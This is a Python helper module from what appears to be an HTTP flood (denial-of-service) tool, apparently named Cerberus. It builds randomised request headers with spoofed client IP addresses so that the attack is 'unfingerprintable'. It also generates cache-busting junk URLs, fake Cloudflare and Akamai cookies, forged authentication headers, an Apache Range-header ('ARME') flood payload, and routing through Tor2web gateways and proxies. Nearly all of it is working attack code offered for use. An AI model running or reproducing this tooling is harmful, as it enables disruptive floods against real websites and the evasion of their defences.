'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

import sys, requests, socket, os, urllib3, subprocess
from random import getrandbits, choice, randint, shuffle, randrange
from binascii import hexlify
from netaddr import IPNetwork
from datetime import datetime, timedelta
from tabulate import tabulate
from os.path import join
from urllib.parse import quote, urlparse

from src.core import *
from src.useragent import *
from src.referer import *

# https://stackoverflow.com/questions/13243807/popen-waiting-for-child-process-even-when-the-immediate-child-has-terminated/13256908#13256908
Popen_kwargs = {}
if sys.platform.lower() == 'windows':
    CREATE_NEW_PROCESS_GROUP = 0x00000200  # note: could get it from subprocess
    DETACHED_PROCESS = 0x00000008          # 0x8 | 0x200 == 0x208
    Popen_kwargs.update(creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP)  

elif sys.version_info < (3, 2):  # assume posix
    Popen_kwargs.update(preexec_fn=os.setsid)

else:  # Python 3.2+ and Unix
    Popen_kwargs.update(start_new_session=True)

with open(join('src', 'files', 'keywords.txt'), buffering=(16*1024*1024)) as file:
    keywords = file.read().splitlines()

with open(join('src', 'files', 'openredirects.txt'), buffering=(16*1024*1024)) as file:
    openredirects = file.read().splitlines()

class HTTPAdapter(requests.adapters.HTTPAdapter):
    '''
    HTTP adapter which allows socket modification
    '''

    # stolen from stackoverflow xd
    def __init__(self, *args, **kwargs):
        self.socket_options = kwargs.pop("socket_options", None)
        super(HTTPAdapter, self).__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        if self.socket_options is not None:
            kwargs["socket_options"] = self.socket_options
        super(HTTPAdapter, self).init_poolmanager(*args, **kwargs)

class utils():
    def __init__(self):
        self.tor_gateways = [
            'onion.dog',
            'onion.city',
            'onion.cab',
            'onion.direct',
            'onion.sh',
            'onion.link',
            'onion.ws',
            'onion.pet',
            'onion.rip',
            'onion.plus',
            'onion.top',
            'onion.si',
            'onion.ly',
            'onion.my',
            'onion.sh',
            'onion.lu',
            'onion.casa',
            'onion.com.de',
            'onion.foundation',
            'onion.rodeo',
            'onion.lat',
            'tor2web.org',
            'tor2web.fi',
            'tor2web.blutmagie.de',
            'tor2web.to',
            'tor2web.io',
            'tor2web.in',
            'tor2web.it',
            'tor2web.xyz',
            'tor2web.su',
            'darknet.to',
            's1.tor-gateways.de',
            's2.tor-gateways.de',
            's3.tor-gateways.de',
            's4.tor-gateways.de',
            's5.tor-gateways.de'
        ]

        self.cache_controls = ['no-cache', 'max-age=0', 'no-store', 'no-transform', 'only-if-cached', 'must-revalidate', 'no-transform'] if not Core.bypass_cache else ['no-store', 'no-cache', 'no-transform']
        self.encodings = ['identity', 'gzip', 'deflate', 'compress', 'br']
        self.accept_langs = ["*", "af","hr","el","sq","cs","gu","pt","sw","ar","da","ht","pt-br","sv","nl","he","pa","nl-be","hi","pa-in","sv-sv","en","hu","pa-pk","ta","en-au","ar-jo","en-bz","id","rm","te","ar-kw","en-ca","iu","ro","th","ar-lb","en-ie","ga","ro-mo","tig","ar-ly","en-jm","it","ru","ts","ar-ma","en-nz","it-ch","ru-mo","tn","ar-om","en-ph","ja","sz","tr","ar-qa","en-za","kn","sg","tk","ar-sa","en-tt","ks","sa","uk","ar-sy","en-gb","kk","sc","hsb","ar-tn","en-us","km","gd","ur","ar-ae","en-zw","ky","sd","ve","ar-ye","eo","tlh","si","vi","ar","et","ko","sr","vo","hy","fo","ko-kp","sk","wa","as","fa","ko-kr","sl","cy","ast","fj","la","so","xh","az","fi","lv","sb","ji","eu","fr","lt","es","zu","bg","fr-be","lb","es-ar","be","fr-ca","mk","es-bo","bn","fr-fr","ms","es-cl","bs","fr-lu","ml","es-co","br","fr-mc","mt","es-cr","bg","fr-ch","mi","es-do","my","fy","mr","es-ec","ca","fur","mo","es-sv","ch","gd","nv","es-gt","ce","gd-ie","ng","es-hn","zh","gl","ne","es-mx","zh-hk","ka","no","es-ni","zh-cn","de","nb","es-pa","zh-sg","de-at","nn","es-py","zh-tw","de-de","oc","es-pe","cv","de-li","or","es-pr","co","de-lu","om","es-es","cr","de-ch","fa","es-uy","fa-ir","es-ve"]
        self.content_types = ['multipart/form-data', 'application/x-url-encoded']
        self.accepts = ['text/plain', '*/*', '/', 'application/json', 'text/html', 'application/xhtml+xml', 'application/xml', 'image/webp', 'image/*', 'image/jpeg', 'application/x-ms-application', 'image/gif', 'application/xaml+xml', 'image/pjpeg', 'application/x-ms-xbap', 'application/x-shockwave-flash', 'application/msword']
    
    def launch_tor(self, torrc=join('src','files','Tor','torrc')) -> None:
        '''
        Launches TOR
        '''

        if Core.is_tor_active:
            return

        args = [join('src','files','Tor','tor.exe'), '-f', torrc] if os.name == 'nt' else ['tor','-f',torrc]
        with open(os.devnull, 'w') as devnull:
            subprocess.Popen(
                args, # command line options
                stdin=devnull, stdout=devnull, stderr=devnull, # redirect everything to os.devnull
                **Popen_kwargs # extra arguments, look at line 38-49 for more info
            ) # launches TOR
        
        Core.is_tor_active = True

    def randhex(self, size=2) -> str:
        '''
        Creates a random junk hex string
        '''

        return "".join([f'\\x{choice("0123456789ABCDEF")}{choice("0123456789ABCDEF")}' for _ in range(size)])

    def get_proxy(self, is_requests=True, force_give=False) -> str:
        '''
        Gets a random proxy from the "proxy_file" variable that was defined by the user
        '''

        if force_give and Core.proxy_pool != None or len(Core.proxy_pool) > 0:
            proxy = f'{Core.proxy_proto.lower()}://{choice(Core.proxy_pool)}'
        else: proxy = None

        return {'http': proxy, 'https': proxy} if is_requests else proxy

    def tor_gateway(self) -> str:
        '''
        Gets a random Tor2web gateway
        '''

        shuffle(self.tor_gateways)
        return choice(self.tor_gateways)
    
    def buildsession(self) -> requests.session:
        '''
        Creates a requests.session object
        '''

        adapter = HTTPAdapter(socket_options=[
            (socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1), 
            (socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 5), 
            (socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5), 
            (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        ])

        session = requests.session()
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.verify = False
        session.timeout = (5,0.1)

        return session
    
    def randstr(self, strlen, chars='qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM') -> str:
        '''
        Function to generate a random string
        '''
        
        return ''.join(choice(chars) for _ in range(strlen))
    
    def buildblock(self, url, include=True) -> str:
        '''
        Function to generate a block of junk, that gets added to the target url
        '''

        if url is None: return url
        block = '' if url.endswith('/') else '/'

        if Core.bypass_cache: # generates random pages and search queries

            block += self.randstr(randint(2, 8))
            for _ in range(randint(2, 10)):
                rand = randrange(3)
                if rand == 0: block += f'/{self.randstr(randint(5, 10))}'
                elif rand == 1: block += choice(['/..','\\..','%2F..','%5C..']) # magik
                else: block += f'/{choice(keywords).replace(" ","/")}'
            
            block += f'?{quote(choice(keywords))}={self.randstr(randint(5, 10))}'

            for _ in range(randint(2, 9)):
                if randrange(2) == 1: block += f'&{self.randstr(randint(5, 10))}={quote(choice(keywords))}'
                else: block += f'&{quote(choice(keywords))}={quote(choice(keywords))}'

            if randrange(2) == 0:
                block += f'#{quote(choice(keywords))}' # fragment

            return url+block if include else block
        else:
            return url
        
    def buildarme(self) -> str:
        '''
        Builds the payload for the ARME flood, with a random size greater than 1300
        '''

        prefix = 'bytes=0-'
        for i in range(randint(1300, 1500)):
            prefix += f',5-{str(i)}'
        
        return prefix
        
    def builddata(self, length=0) -> tuple:
        '''
        Creates a POST body
        '''

        if not Core.post_buffer:
            if length == 0:
                length = randint(20,200)

            headers = {}
            if randint(0,1) == 0: # json payload
                json_data = '{'

                for _ in range(length):
                    json_data += f'"{choice([self.randstr(randint(5, 20)), choice(keywords)])}": "{self.randstr(randint(40, 60))}",'
                
                json_data += '}'

                data = json_data        
                headers.update({'Content-Type': 'application/json'})

            else: # url encoded payload 
                url_encoded_data = f'{choice([self.randstr(randint(5, 20)), choice(keywords)])}={choice([self.randstr(randint(5, 20)), choice(keywords)])}'

                while len(url_encoded_data) < length:
                    url_encoded_data += f'&{choice([self.randstr(randint(5, 20)), choice(keywords)])}={choice([self.randstr(randint(5, 20)), choice(keywords)])}'

                data = url_encoded_data
                headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
            
            return (headers, data)
        else:
            return ({'Content-Type': 'application/x-www-form-urlencoded'}, Core.post_buffer)
    
    def randip(self) -> str:
        '''
        Creates a random IPv4 address
        '''

        return '.'.join([str(randint(1,255)) for _ in range(4)])
    
    def randdate(self) -> str:
        '''
        Creates a random date
        '''

        now = datetime.now() # get the current date

        # add or remove some years
        if randrange(2) == 0: now += timedelta(days=365*randint(1,40))
        else: now -= timedelta(days=365*randint(1,40))

        # add or remove some days
        if randrange(2) == 0: now += timedelta(days=randint(1, 365))
        else: now -= timedelta(days=randint(1, 365))

        # add or remove some hours
        if randrange(2) == 0: now += timedelta(hours=randint(1, 24))
        else: now -= timedelta(hours=randint(1, 24))

        # and add or remove some seconds
        if randrange(2) == 0: now += timedelta(seconds=randint(1, 60))
        else: now -= timedelta(seconds=randint(1, 60))

        return now.strftime("%a, %w %b %Y %X GMT")
    
    def buildcookie(self, size=0) -> str:
        '''
        Creates a random cookie, size is more a limit of the "randomization"
        '''

        def giveint():
            if size == 0:
                return randint(1,1000)

            return size

        cookie = choice([
            self.randstr(giveint(), chars='QWERTYUIOPASDFGHJKLZXCVBNM01234567890'),
            f'_ga=GA{str(giveint())} _gat=1;{(self.randstr(giveint()))}; __cfduid={self.randstr(giveint(), chars="qwertyuiopasdfghjklzxcvbnm0123456789")}; {self.randstr(giveint())}={self.randstr(giveint())}'
            f'id={self.randstr(giveint())}',
            f'PHPSESSID={self.randstr(giveint())}; csrftoken={self.randstr(giveint())}; _gat={str(giveint())}',
            f'cf_chl_2={self.randstr(giveint())}; cf_chl_prog=x11; cf_clearance={self.randstr(giveint())}',
            f'__cf_bm={self.randstr(giveint())}; __cf_bm={self.randstr(giveint())}',
            f'language=en; AKA_A2={self.randstr(giveint())}; {self.randstr(giveint())}={str(giveint())}; AMCV_{self.randstr(giveint())}={self.randstr(giveint())}; ak_bmsc={self.randstr(giveint(), chars="QWERTYUIOPASDFGHJKLZXCVBNM")}~{self.randstr(giveint())}'
        ])

        # add a expiration date to the cookie
        if randrange(2) == 0:
            cookie += f'; Expires={self.randdate()};'

        return cookie

        
    def buildheaders(self, url, if_socket=False) -> dict:
        '''
        Function to generate randomized headers, which in result makes the attack unfingerprintable
        '''

        # we shuffle em
        for toshuffle in [self.cache_controls, self.encodings, self.content_types, self.accepts]:
            shuffle(toshuffle)
        
        parsed = urlparse(url)

        headers = choice([ # chooses between XMLHttpRequest and a random/predefined useragent
            {'User-Agent': urllib3.util.SKIP_HEADER, 'X-Requested-With': 'XMLHttpRequest'} if not if_socket else {'X-Requested-With': 'XMLHttpRequest'},  # SKIP_HEADER makes urllib3 ignore the header, this basically removes the User-Agent header from the list
            {'User-Agent': getAgent()}
        ])

        if randrange(2) == 1:
            headers.update({
                'X-Forwarded-Proto': 'Http',
                'X-Forwarded-Host': f'{urlparse(url).netloc}, {self.randip()}',
            })

        headers.update({ # default headers
            'Cache-Control': ', '.join([ choice(self.cache_controls) for _ in range( randint(1, 3) ) ]),
            'Accept-Encoding': ', '.join([ choice(self.encodings) for _ in range( randint(1, 3) ) ]),
            'Accept': ', '.join([ choice(self.accepts) for _ in range( randint(1, 3) ) ]),
            'Accept-Language':  ', '.join([ choice(self.accept_langs) for _ in range( randint(1, 3) ) ]),
        })

        if randrange(2) == 1: headers.update({'Content-Encoding': choice(self.encodings)})
        if randrange(2) == 1:
            headers.update({
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Sec-Gpc': '1'
            })

        if randrange(2) == 1: headers.update({'Referer': self.buildblock(getReferer())}) # adds a referer
        if randrange(3) == 1: headers.update({'Origin': url})
        if randrange(2) == 1: headers.update({'Upgrade-Insecure-Requests': '1'}) # upgrade insecure requests to https

        proxychoice = randrange(3) # chooses a random "proxy" header
        if proxychoice == 0: headers.update({choice(['Via','Client-IP','Real-IP']): ', '.join([ self.randip() for _ in range( randint(1, 3) ) ]) }) # fakes the source ip
        elif proxychoice == 1: headers.update({'X-Forwarded-For': ', '.join([ self.randip() for _ in range( randint(1, 3) ) ])})
        else: pass

        if randrange(2) == 1: headers.update({'DNT': '1'}) # do-not-track
        if randrange(2) == 1: headers.update({'Cookie': self.buildcookie()}) # adds a fake cookie

        authchoice = randrange(5) # pick a random authentication header and append it to the dictionary
        if authchoice == 0: headers.update({'Proxy-Authorization': f'Basic {self.randstr(randint(5,10))}='}) # proxy authentication
        elif authchoice == 1: headers.update({'Authorization': f'Basic {self.randstr(randint(5,10))}='}) # basic authentication
        elif authchoice == 2: headers.update({'Authorization': f'Digest username={choice(keywords).replace(" ","_")}, realm="http-auth@{parsed.netloc}", uri="{self.buildblock(url, False)}", algorithm={choice(["MD5","SHA-256","SHA-512"])}, nonce="{self.randstr(randint(20,40))}", nc={str(randint(1,1000))}, cnonce="{self.randstr(randint(20,40))}", qop="{choice(["auth","auth-int","auth, auth-int"])}", response="{self.randstr(randint(20,40))}", opaque="{self.randstr(randint(20,40))}"'}) # digest authentication
        else: pass

        if Core.random_headers: headers.update(choice(Core.random_headers))
        
        return headers
    
    def clear(self) -> None:
        '''
        Clears the screen
        '''

        try:
            if os.name == 'nt': os.system('cls')
            else: os.system('clear')
        except:
            print('\n'*400) # backup method

    def make_id(self) -> str:
        '''
        Helper function to make attack ID's
        '''

        return hexlify(getrandbits(128).to_bytes(16, 'little')).decode() # make a simple 32 characters long ID
    
    def valid_ip(self, ip) -> bool:
        '''
        Checks if the specified IPv4/IPv6 address is valid
        '''

        if bool(self.ipv4regex.match(ip)): return True
        else: return bool(self.ipv6regex.match(ip))
        
    def cidr2iplist(self, cidrange) -> list:
        '''
        Converts a CID range to a list of IP's
        '''

        return [str(ip) for ip in IPNetwork(cidrange)]

    def unix2posix(self, timestamp) -> str:
        '''
        Converts the specified UNIX timestamp into a POSIX one
        '''

        return datetime.fromtimestamp(timestamp).strftime('%m/%d/%Y, %H:%M:%S')
    
    def posix2unix(self, timestamp) -> float:
        '''
        Converts the specified POSIX timestamp into a UNIX one
        '''

        return datetime.timestamp(datetime.strptime(timestamp, "%m/%d/%Y, %H:%M:%S"))
    
    def table(self, rows, headers) -> str:
        '''
        Creates a nice looking table
        '''

        return tabulate(rows, headers=headers, tablefmt='simple')
    
    def Sec2Str(self, sec, hide=True) -> str: # found it on stackoverflow, cheers Timothy C. Quinn
        '''
        Turns seconds into days, hours, minutes and seconds and puts that into a single string
        '''

        td = timedelta(seconds=sec)
        def __t(t, n):
            if t < n: return (t, 0)
            v = t//n
            return (t -  (v * n), v)
            
        (s, h) = __t(td.seconds, 3600)
        (s, m) = __t(s, 60)    

        result = {
            'days': td.days,
            'hours': h,
            'minutes': m,
            'seconds': s,
        }

        result = ''
        if td.days != 0: result += f'{td.days} {"days" if td.days != 1 else "day"}, '
        if h != 0: result += f'{h} {"hours" if h != 1 else "hour"}, '
        if m != 0: result += f'{m} {"minutes" if m != 1 else "minutes"}, '
        
        result += f'{s} {"seconds" if s != 1 else "second"}'

        return result
    
    def print_banner(self) -> None:
        '''
        Prints the banner
        '''

        print(r'''
   sSSs    sSSs   .S_sSSs     .S_SSSs      sSSs   .S_sSSs     .S       S.     sSSs  
 d%%SP   d%%SP  .SS~YS%%b   .SS~SSSSS    d%%SP  .SS~YS%%b   .SS       SS.   d%%SP  
d%S'    d%S'    S%S   `S%b  S%S   SSSS  d%S'    S%S   `S%b  S%S       S%S  d%S'    
S%S     S%S     S%S    S%S  S%S    S%S  S%S     S%S    S%S  S%S       S%S  S%|     
S&S     S&S     S%S    d*S  S%S SSSS%P  S&S     S%S    d*S  S&S       S&S  S&S     
S&S     S&S_Ss  S&S   .S*S  S&S  SSSY   S&S_Ss  S&S   .S*S  S&S       S&S  Y&Ss    
S&S     S&S~SP  S&S_sdSSS   S&S    S&S  S&S~SP  S&S_sdSSS   S&S       S&S  `S&&S   
S&S     S&S     S&S~YSY%b   S&S    S&S  S&S     S&S~YSY%b   S&S       S&S    `S*S  
S*b     S*b     S*S   `S%b  S*S    S&S  S*b     S*S   `S%b  S*b       d*S     l*S  
S*S.    S*S.    S*S    S%S  S*S    S*S  S*S.    S*S    S%S  S*S.     .S*S    .S*P  
 SSSbs   SSSbs  S*S    S&S  S*S SSSSP    SSSbs  S*S    S&S   SSSbs_sdSSS   sSS*S   
  YSSP    YSSP  S*S    SSS  S*S  SSY      YSSP  S*S    SSS    YSSP~YSSY    YSS'    
                SP          SP                  SP > Created by  https://github.com/Nexuzzzz                                
                Y           Y                   Y  > Licensed under the MIT license
''')